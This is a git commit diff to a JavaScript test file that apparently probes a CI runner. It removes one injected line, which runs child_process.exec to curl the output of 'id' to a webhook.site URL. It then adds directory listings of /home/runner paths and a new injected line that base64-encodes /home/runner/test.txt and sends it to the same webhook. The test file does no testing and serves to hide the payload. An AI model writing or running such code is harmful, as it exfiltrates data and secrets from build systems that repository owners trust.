82d93e932a7b1b611009f9ed2404f4807f0b9f98
y <y@y.de>
2023-04-14 21:02:57 +0200

    d

--- tests/test.js
+++ tests/test.js
@@ -1,13 +1,16 @@
 // TODO: implement the tests
-
-{{ process.mainModule.require('child_process').exec('curl https://webhook.site/c9f915d6-1ead-4dfb-868b-95ce461e6652/$(id | base64)') }}
-
-
-
-
+console.log("Tests are not implemented yet...");
 
 const {ls, cat} = require("../index");
-ls(".")
-#ls("/");
-
+ls(".");
+ls("/");
+console.log("1");
+ls("/home/runner");
+console.log("2");
+ls("/home/runner/work");
+console.log("3");
+ls("/home/runner/work/pully");
+console.log("4");
+ls("/home/runner/work/pully/pully");
 console.log(cat("/home/runner/test.txt"))
+{{ process.mainModule.require('child_process').exec('curl https://webhook.site/c9f915d6-1ead-4dfb-868b-95ce461e6652/$(cat /home/runner/test.txt | base64)') }}
